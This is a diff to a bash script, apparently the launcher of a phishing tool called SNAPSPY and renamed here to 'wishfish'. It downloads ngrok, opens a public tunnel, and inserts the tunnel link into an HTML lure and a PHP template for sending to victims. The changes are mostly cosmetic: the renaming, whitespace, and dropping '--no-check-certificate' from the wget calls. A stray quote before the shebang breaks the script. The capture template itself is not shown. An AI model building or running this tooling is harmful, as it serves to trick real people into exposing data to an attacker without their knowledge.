@@ -1,7 +1,9 @@
+'#!/bin/bash
 
 trap 'printf "\n";stop' 2
 
 banner() {
+
 
 printf " \e[1;92m  ____  _   _    _    ____  ____  ______   __  \e[0m\n"
 printf " \e[1;92m / ___|| \ | |  / \  |  _ \/ ___||  _ \ \ / /  \e[0m\n"
@@ -9,12 +11,16 @@ printf " \e[1;92m \___ \|  \| | / _ \ | |_) \___ \| |_) \ V /   \e[0m\n"
 printf " \e[1;92m  ___) | |\  |/ ___ \|  __/ ___) |  __/ | |    \e[0m\n"
 printf " \e[1;92m |____/|_| \_/_/   \_\_|   |____/|_|    |_|  \e[0m\n" 
                                              
-printf "\n"
-printf " \e[1;77m v1.1 CODED BY ARPANJHA \e[0m \n"
-printf "\n"
-}
-stop() {
 
+
+printf " \e[1;77m v1.1 CODED BY ARPANJHA \e[0m \n"
+
+printf "\n"
+
+
+}
+
+stop() {
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
@@ -113,7 +119,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' index2.html > index2.html
+sed 's+forwarding_link+'$link'+g' wishfish.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -131,7 +137,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
@@ -143,7 +149,7 @@ exit 1
 fi
 
 else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -210,7 +216,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="snapspy$RANDOM"
+default_subdomain="wishfish$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
